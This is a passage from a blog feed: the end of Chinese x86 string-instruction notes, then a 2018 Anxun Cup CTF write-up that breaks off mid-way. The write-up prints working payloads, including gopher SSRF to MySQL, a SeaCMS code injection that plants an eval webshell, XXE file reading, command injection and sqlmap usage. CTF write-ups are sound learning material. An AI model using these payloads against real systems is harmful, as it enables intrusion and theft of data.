title="字符串比较"></a>字符串比较</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span></span><br><span class="line">CmpsTestSource <span class="built_in">byte</span> <span class="string">"ABCDE"</span></span><br><span class="line">CmpsTestTarget  <span class="built_in">byte</span> <span class="string">"AB   "</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">CMPSTEST proc</span><br><span class="line">  <span class="keyword">cld</span></span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">esi</span> , offset CmpsTestSource</span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">edi</span> , offset CmpsTestTarget</span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">ecx</span>, lengthof CmpsTestSource  <span class="comment">;最多比较次数，此例为5</span></span><br><span class="line">  <span class="keyword">repe</span>  <span class="keyword">cmpsb</span> <span class="comment">; 比较到第三个字母时，因两者不等，重复不再继续，但当前串</span></span><br><span class="line">                         <span class="comment">; 操作执行完，esi和edi还会增加。所以，最后，esi和edi会指向</span></span><br><span class="line">                         <span class="comment">; 第四个字母的位置。</span></span><br><span class="line">  <span class="keyword">ret</span></span><br><span class="line">CMPSTEST endp</span><br></pre></td></tr></table></figure><h3 id="SCASB-SCASW-SCASD"><a href="#SCASB-SCASW-SCASD" class="headerlink" title="SCASB,SCASW,SCASD"></a>SCASB,SCASW,SCASD</h3><p>将AL的值与EDI指向的内存内容相比较(相当于cmp AL , [edi])，即相当于是做查找操作，通常会跟重复前缀</p><ul><li>如果使用repe前缀，则将查找到EDI开始的内存中第一个不等于AL时中止重复;</li><li>如果使用repne前缀，则将查找到EDI开始的内存中第一个等于AL时中止重复;</li><li>当然，如果ecx减到0，也会结束查找<br><code>SCASW</code>是用AX作字查找，<code>SCASD</code>是用EAX作双字查找<h4 id="扫描一个匹配字符"><a href="#扫描一个匹配字符" class="headerlink" title="扫描一个匹配字符"></a>扫描一个匹配字符</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">  alpha <span class="built_in">byte</span> “ABCDEFGH”,<span class="number">0</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edi</span> , offset alpha</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">al</span> , ‘F’</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof alpha</span><br><span class="line">  <span class="keyword">cld</span></span><br><span class="line">  <span class="keyword">repne</span> <span class="keyword">scasb</span>   <span class="comment">;不相等则重复，即找到第一个相等的</span></span><br><span class="line">  <span class="keyword">jnz</span> quit    <span class="comment">; 如果这个条件满足，表示是找完整个ecx长度，也没有找到</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">edi</span>   <span class="comment">;回减一，让edi指向找到第一个相等的位置</span></span><br><span class="line">  …</span><br><span class="line"><span class="symbol">Quit:</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="STOSB-STOSW-STOSD"><a href="#STOSB-STOSW-STOSD" class="headerlink" title="STOSB,STOSW,STOSD"></a>STOSB,STOSW,STOSD</h3><p>把AL/AX/EAX的内容存储在EDI指向的内存单元中，同时EDI的值根据方向标志的值增加和减少。<br>Stosb是存储AL，stosw存储AX，stosd存储EAX   使用rep前缀可以对一段内存进行填充</p><h3 id="LODSB-LODSW-LODSD"><a href="#LODSB-LODSW-LODSD" class="headerlink" title="LODSB,LODSW,LODSD"></a>LODSB,LODSW,LODSD</h3><p>将从esi指向的内存内容取出存到累加器中，同时，修改esi的值。<br><code>lodsb</code>是取出一个字节存到AL中，<code>lodsw</code>是取出一个字存到AX中，<code>lodsd</code>是取出一个双字存到EAX中。<br><strong>该指令一般不会跟重复前缀</strong></p><h3 id="串操作指令对标志位的影响"><a href="#串操作指令对标志位的影响" class="headerlink" title="串操作指令对标志位的影响"></a>串操作指令对标志位的影响</h3><p><code>cmps</code>和<code>scas</code>指令会对标志位有影响，影响效果如同CMP指</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-IA32处理器体系结构&quot;&gt;&lt;a href=&quot;#0x00-IA32处理器体系结构&quot; class=&quot;headerlink&quot; title=&quot;0x00 IA32处理器体系结构&quot;&gt;&lt;/a&gt;0x00 IA32处理器体系结构&lt;/h2&gt;&lt;h3 id=&quot;微机的基本结构&quot;&gt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://www.twosmi1e.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯writewp</title>
    <link href="https://www.twosmi1e.com/2018/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFwritewp/"/>
    <id>https://www.twosmi1e.com/2018/11/26/安洵杯writewp/</id>
    <published>2018-11-26T13:37:41.000Z</published>
    <updated>2018-11-26T13:42:11.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="CRC"><a href="#CRC" class="headerlink" title="CRC"></a>CRC</h3><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">buf = str(i).rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line"><span class="comment">#print buf</span></span><br><span class="line">    <span class="keyword">if</span> zlib.crc32(buf) &amp; <span class="number">0xffffffff</span> == <span class="number">0x0cd95dac</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>,buf</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/安洵杯writewp/1543154531102.png" alt="Alt text"><br>然后再用.py跑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment">#f = open("password.txt",'r')</span></span><br><span class="line"><span class="comment">#password = f.readline()</span></span><br><span class="line">password=<span class="string">'08646247'</span></span><br><span class="line">b64_str = base64.b64encode(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update(b64_str)</span><br><span class="line">zip_passowrd = hash.hexdigest()</span><br><span class="line">print(zip_passowrd)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/安洵杯writewp/1543154965351.png" alt="Alt text"><br>再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。<br><img src="/2018/11/26/安洵杯writewp/1543155653161.png" alt="Alt text"><br>修改高度为500<br><img src="/2018/11/26/安洵杯writewp/1543155673584.png" alt="Alt text"><br>可以看到flag了导出 提取文字完事。<br><img src="/2018/11/26/安洵杯writewp/1543155715575.png" alt="Alt text"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>提示输入NOHO<br>测出来要求在7399999999到7400000000<br><a href="http://222.18.158.227:10580/?NOHO[]=d" target="_blank" rel="external">http://222.18.158.227:10580/?NOHO[]=d</a>  数组绕过<br><img src="/2018/11/26/安洵杯writewp/1543026226298.png" alt="Alt text"><br>输密码<br><code>&lt;!--SELECT master FROM secret WHERE password = binary &#39;c���{��Pykd��HE&#39;--&gt;</code><br>发现是MD5加密后16进制转字符<br><img src="/2018/11/26/安洵杯writewp/1543150100581.png" alt="Alt text"><br>MD5注入<br>ffifdyop<br><img src="/2018/11/26/安洵杯writewp/1543150034193.png" alt="Alt text"></p><h3 id="蒙古-Diglett"><a href="#蒙古-Diglett" class="headerlink" title="蒙古 Diglett"></a>蒙古 Diglett</h3><p>ssrf<br><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a> 找到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line">    if (isset($_POST[&apos;url&apos;])&amp;&amp;!empty($_POST[&apos;url&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $url = $_POST[&apos;url&apos;];</span><br><span class="line">        if(preg_match(&apos;/file/&apos;,$url))</span><br><span class="line">        &#123;</span><br><span class="line">             echo &quot;No hacker!&quot;;</span><br><span class="line">             echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $url2 = preg_replace(&apos;/file/&apos;,&apos;&apos;,$url);</span><br><span class="line">        $content_url = getUrlContent($url2);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $content_url = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($_GET[&apos;hu3debug&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure></p><p>过滤了file尝试双写绕过<br>读配置文件<br>url=fifilele://localhost/var/www/config.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hosts = &quot;localhost&quot;;</span><br><span class="line">$dbusername = &quot;test_user&quot;;</span><br><span class="line">$dbpasswd = &quot;&quot;;</span><br><span class="line">$dbname = &quot;test&quot;;</span><br><span class="line">$dbport = 3306;</span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line">function initdb($conn)</span><br><span class="line">&#123;</span><br><span class="line">$dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;</span><br><span class="line">if(mysqli_query($conn,$dbinit)) return 1;</span><br><span class="line">else return 0;</span><br><span class="line">&#125;</span><br><span class="line">function safe($url)</span><br><span class="line">&#123;</span><br><span class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line">if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)</span><br><span class="line">&#123;</span><br><span class="line">var_dump($tmpurl);</span><br><span class="line">die(&quot;&lt;h1&gt;&lt;p id=&apos;test1&apos;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return $url;</span><br><span class="line">&#125;</span><br><span class="line">function getUrlContent($url)&#123;</span><br><span class="line">$url = safe($url);</span><br><span class="line">$url = escapeshellarg($url);</span><br><span class="line">$pl = &quot;curl &quot;.$url;</span><br><span class="line">echo $pl;</span><br><span class="line">$content = shell_exec($pl);</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>知道了mysql的配置内容 gopher一波<br><img src="/2018/11/26/安洵杯writewp/1543075424002.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/安洵杯writewp/1543207604363.png" alt="Alt text"></p><p>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p><h3 id="BOOM-web"><a href="#BOOM-web" class="headerlink" title="BOOM web"></a>BOOM web</h3><p>御剑扫目录<br>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="/2018/11/26/安洵杯writewp/1543158391091.png" alt="Alt text"><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。<br><img src="/2018/11/26/安洵杯writewp/1543158721467.png" alt="Alt text"><br>登录拿flag<img src="/2018/11/26/安洵杯writewp/1543158778138.png" alt="Alt text"><br>70e052657cb40cf142883abaff266fee</p><h3 id="中国-webN"><a href="#中国-webN" class="headerlink" title="中国 webN"></a>中国 webN</h3><p><img src="/2018/11/26/安洵杯writewp/1543206219303.png" alt="Alt text"><br>首页一个SRC界面，没什么用<br>点礼品中心<a href="http://222.18.158.245:6080/reward.php点击购买" target="_blank" rel="external">http://222.18.158.245:6080/reward.php点击购买</a><br><img src="/2018/11/26/安洵杯writewp/1543206407046.png" alt="Alt text"><br>发现用户可控jsonp<br><img src="/2018/11/26/安洵杯writewp/1543206721265.png" alt="Alt text"><br>看提示some攻击，翻文章<br><a href="https://paper.tuisec.win/detail/05c9c8b3e28bd2b" target="_blank" rel="external">https://paper.tuisec.win/detail/05c9c8b3e28bd2b</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/169873.html</a><br>然后还提示联系客服，思路大概就是构造exp放vps上，发客服让机器人访问，子页面通过可控jsonp对父页面操作<br><img src="/2018/11/26/安洵杯writewp/1543159598524.png" alt="Alt text"><br>查日志发现flag<br><img src="/2018/11/26/安洵杯writewp/1543159548320.png" alt="Alt text"></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目提示Find The d0g3.php In Intranets<br><img src="/2018/11/26/安洵杯writewp/1543215290607.png" alt="Alt text"><br>在name提交框那里随便提交一个test，发现输出到了url的url参数<br><a href="http://222.18.158.227:10180/?url=test#" target="_blank" rel="external">http://222.18.158.227:10180/?url=test#</a><br>思路大概就有了，ssrf扫内网，访问d0g3.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http%3A%2F%2F10.10.1.0-255&apos;</span><br></pre></td></tr></table></figure><p>扫一遍发现有<code>10.10.1.3</code>和<code>10.10.1.6</code>两台主机，利用同样的方法扫描端口，发现只有80端口，并且只有<code>10.10.1.6</code>主机才有d0g3.php，访问<code>10.10.1.6/d0g3.php</code>提示<br><code>curl -v &#39;http://222.18.158.227:10180/?url=http%3A%2F%2F10.10.1.6%2Fd0g3.php&#39;</code><br><img src="/2018/11/26/安洵杯writewp/1543215732496.png" alt="Alt text"></p><p>传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo();&apos;</span><br></pre></td></tr></table></figure><p>发现执行了命令</p><p>于是读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo `cat flag.txt`; &apos;</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;SSRF_Is_So_Easy&#125;</span><br></pre></td></tr></table></figure><h3 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h3><p>查找poc getshell<br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a></p><p><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</span><br></pre></td></tr></table></figure></p><p>那就写shell吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&apos;../shell.php&apos;,&apos;&lt;?php%20@eval($_POST[123])?&gt;&apos;);</span><br></pre></td></tr></table></figure></p><p>提示.git泄露，用工具读出源码吧<br>\data\ common.inc.php有配置信息</p><p>直接写sql语句读取flag</p><p><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=$con =mysql_connect(&quot;localhost&quot;,&quot;d0g3&quot;,&quot;FlagIsHere&quot;);</span><br><span class="line">mysql_select_db(&quot;flag&quot;, $con);</span><br><span class="line">$result = mysql_query(&quot;SELECT * from flag&quot;);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">var_dump($row);</span><br></pre></td></tr></table></figure></p><p>RDBnM3tUaGlzX2lzX3JlYWxfZmxhZ30=<br>Base64解码：D0g3{This_is_real_flag}</p><h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p>思路是在忘记密码处，填入管理员账户<code>admin</code>，重置管理员账号密码，然后登录管理员账号。</p><p>但是重置时会发送重置邮件，根据官方的提示，抓包将host改为vps地址，然后在vbs上开启一个web服务，目标主机就会带着重置token去访问我们的vps，然后我们利用这个token访问密码重置页面就能重置admin密码了</p><p>登录后还有一个输入框，任意提交一个字符串后抓包发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</span><br></pre></td></tr></table></figure><p>xxe无误，直接读取文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY myentity SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">information</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;myentity;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;/<span class="name">information</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部实体注入  Filter协议读文件  记得base6<br>拿到flag.php的base64编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==</span><br></pre></td></tr></table></figure><p>解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">echo &quot;&lt;center&gt;&lt;font size=&apos;5&apos; color=&apos;red&apos;&gt;&quot;;</span><br><span class="line">echo &quot;You wanna capture this flag?&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Oh yes, here!&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;But now, &quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Get out!&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;/center&gt;&quot;;</span><br><span class="line">//flag: D0g3&#123;Hi_D0g3_Res3t_4nd_xXe&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="simple-sqli"><a href="#simple-sqli" class="headerlink" title="simple sqli"></a>simple sqli</h3><p>一开始以为是二次注入，因为注册一个test’，登录后会报错。后面发现是cookie注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --cookie &quot;PHPSESSID=p6364j7vahfs88uiesq03g1e25;uname=1&quot; --dbms mysql --level 2 --tamper base64encode,charencode --sql-shell</span><br></pre></td></tr></table></figure><p>当时进入了sql-shell，但是马上时间截止了，很慌就没来得及找web路径，赛后发现有phpinfo</p><p>直接读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/www/sqli/secret.php&apos;)</span><br></pre></td></tr></table></figure><p>base64解码后就是flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;iaown_oiasnd_asdasda&#125;</span><br></pre></td></tr></table></figure><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash!!!"></a>Hash!!!</h3><p>响应头的source改为1就能拿到核心源码，可以看到是cbc翻转攻击，利用hashpump来构造poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">$flag = &quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;;</span><br><span class="line">$secret_key = &quot;xxxxxxxxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line">header(&quot;hash_key:&quot; . $hash_key);</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getflag&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Great! You&apos;re in!\n&quot;;</span><br><span class="line">            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Go out! Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;LEAVE! You&apos;re not one of us!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;&lt;source_code&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashpump</span><br><span class="line">Input Signature: c3ef608fdc59d9143c39664ade7556d5</span><br><span class="line">Input Data: D0g3</span><br><span class="line">Input Key Length: 20</span><br><span class="line">Input Data to Add: 